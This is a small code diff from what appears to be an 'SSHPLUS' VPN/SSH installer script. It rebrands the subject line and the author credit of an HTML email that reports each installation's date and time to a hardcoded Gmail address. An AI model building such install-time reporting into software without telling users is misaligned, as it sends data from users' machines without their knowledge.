@@ -19,7 +19,7 @@ _HORA_ = str(_DATA_.hour)
 _MINUTO_ = str(_DATA_.minute)
 _SEGUNDO_ = str(_DATA_.second)
 _MSG_ = MIMEMultipart('alternative')
-_MSG_['Subject'] = "INSTALACAO DO SSHPLUS"
+_MSG_['Subject'] = "INSTALACAO DO INOVE SSHPLUS"
 _MSG_['From'] = 'crzvpn@gmail.com'
 _MSG_['To'] = 'crzvpn@gmail.com'
 _TEXTO_ = """\
@@ -43,7 +43,7 @@ _TEXTO_ = """\
 <br><b><font color="blue">Hora: </b></font><i> <b><font color="red">""" + _HORA_ +"""</font></b></i>
 <br><b><font color="blue">Minutos: </b></font> <i><b><font color="red">""" + _MINUTO_ + """</font></b></i>
 <br><b><font color="blue">Segundos: </b></font> <i><b><font color="red">""" + _SEGUNDO_ + """</font></b></i>
-<b><p>══════════════════════════</p><b><b><i><font color="#00FF00">By: crazy</i></b></br></p>
+<b><p>══════════════════════════</p><b><b><i><font color="#00FF00">By: Henry</i></b></br></p>
 </body>
 </html>
 """
